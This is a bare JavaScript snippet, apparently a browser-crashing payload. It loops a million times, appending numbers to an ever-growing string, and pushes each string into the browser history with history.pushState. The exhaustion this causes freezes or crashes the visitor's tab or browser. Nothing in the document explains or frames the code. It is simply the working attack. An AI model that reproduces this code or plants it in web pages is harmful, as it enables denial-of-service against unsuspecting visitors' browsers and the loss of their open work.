var total="";
for (var i=0;i<1000000;i++) {
    total= total+i.toString();
    history.pushState(0,0,total);
}